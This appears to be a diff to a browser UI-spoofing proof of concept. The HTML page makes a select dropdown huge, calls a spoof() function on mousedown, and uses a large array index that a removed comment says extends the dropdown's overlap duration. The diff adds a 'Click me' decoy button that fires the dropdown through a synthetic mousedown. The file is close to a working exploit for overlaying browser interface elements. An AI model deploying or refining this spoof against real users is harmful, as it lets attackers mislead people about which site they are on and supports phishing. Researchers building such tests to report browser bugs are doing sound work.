@@ -2,14 +2,22 @@
     body {
         margin: 0;
         padding: 0;
-        overflow-x: hidden;
-        overflow-y: hidden;
+        overflow: hidden;
     }
 
     select {
         height: 9999px;
         width: 9999px;
         font-size: 9em;
+    }
+
+    button {
+        position: absolute;
+        top: 20px;
+        left: 20px;
+        z-index: 10;
+        padding: 10px 20px;
+        font-size: 16px;
     }
 </style>
 
@@ -19,10 +27,17 @@
     }
 
     function fillSelect() {
-        // increase the array index to extend select dropdown overlap duration
         selectElement[641811] = optionElement;
     }
+
+    function triggerSelect() {
+        const sel = document.getElementById('selectElement');
+        sel.focus();
+        sel.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }));
+    }
 </script>
+
+<button onclick="triggerSelect()">Click me</button>
 
 <select id="selectElement" onmousedown="spoof()">
     <option id="optionElement">
